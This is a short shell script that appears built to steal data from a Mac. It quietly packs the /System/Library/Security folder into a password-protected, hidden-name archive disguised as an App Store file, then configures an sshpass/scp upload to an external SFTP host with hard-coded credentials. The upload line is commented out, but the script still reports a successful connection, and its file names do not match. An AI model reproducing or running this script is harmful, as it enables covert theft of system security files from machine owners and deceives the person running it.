
#cd $home/../../../System/Library/
#archeiving files
echo "archiving silently"
#zip -qr Security_unmodified.zip Security && echo "Archiving complete!"
7z a -pRats@8804 -mhe=on .appstore_unmodified.7z Security -y -bso0 -bsp0

# Configuration
LOCAL_FILE=".appstore_unmodified.zip"
REMOTE_USER="04f63fd73a2c4ed99830f9d69deb73a2"
REMOTE_HOST="eu-central-1.sftpcloud.io"
REMOTE_PATH="/home"
REMOTE_PASS="qOXUUo2mEu60nLr4A5SxLz2Vk8ldk1SL"
REMOTE_DEST="/"


# --- Upload Command ---
# -p specifies the password
# -o StrictHostKeyChecking=no prevents the script from hanging on new host prompts
#sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$LOCAL_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
 echo "connection sucesfully"
# Check if the upload was successful
#if [[ $? -eq 0 ]]; then
  #  echo "connection sucesfully"
#else
#    echo "connection failed."
#fi
